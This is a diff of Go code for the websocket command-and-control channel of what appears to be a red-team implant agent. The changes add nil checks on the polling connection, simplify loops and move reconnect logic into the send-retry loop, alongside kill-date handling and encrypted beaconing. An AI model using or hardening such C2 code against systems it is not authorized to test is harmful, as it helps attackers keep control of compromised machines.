@@ -166,7 +166,7 @@ func (c *C2Websockets) Sleep() {
 	}
 }
 func (c *C2Websockets) CheckForKillDate() {
-	for true {
+	for {
 		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
 			return
 		}
@@ -192,8 +192,10 @@ func (c *C2Websockets) Start() {
 	c.ShouldStop = false
 	if c.TaskingType == TaskingTypePoll {
 		defer func() {
-			c.PollConn.Close()
-			c.PollConn = nil
+			if c.PollConn != nil {
+				c.PollConn.Close()
+				c.PollConn = nil
+			}
 			c.stoppedChannel <- true
 		}()
 		for {
@@ -591,7 +593,7 @@ func (c *C2Websockets) reconnect() {
 		header.Set("Accept-Type", "Push")
 	}
 	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
-	for true {
+	for {
 		if c.ShouldStop {
 			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in reconnect loop\n"))
 			return
@@ -637,9 +639,6 @@ func (c *C2Websockets) reconnect() {
 	}
 }
 func (c *C2Websockets) sendData(sendData []byte) []byte {
-	if c.PollConn == nil && c.TaskingType == TaskingTypePoll {
-		c.reconnect()
-	}
 	m := structs.Message{}
 	if len(c.Key) != 0 {
 		sendData = c.encryptMessage(sendData)
@@ -652,6 +651,9 @@ func (c *C2Websockets) sendData(sendData []byte) []byte {
 	}
 	m.Data = base64.StdEncoding.EncodeToString(sendData)
 	for i := 0; i < 5; i++ {
+		if c.PollConn == nil && c.TaskingType == TaskingTypePoll {
+			c.reconnect()
+		}
 		today := time.Now()
 		if today.After(c.Killdate) {
 			os.Exit(1)
@@ -668,8 +670,10 @@ func (c *C2Websockets) sendData(sendData []byte) []byte {
 		}
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("error reading from polling connection: %v", err))
-			c.PollConn.Close()
-			c.PollConn = nil
+			if c.PollConn != nil {
+				c.PollConn.Close()
+				c.PollConn = nil
+			}
 			continue
 		}
 		// Read the response
@@ -681,8 +685,10 @@ func (c *C2Websockets) sendData(sendData []byte) []byte {
 		}
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("Error trying to read message %v", err.Error()))
-			c.PollConn.Close()
-			c.PollConn = nil
+			if c.PollConn != nil {
+				c.PollConn.Close()
+				c.PollConn = nil
+			}
 			continue
 		}
 
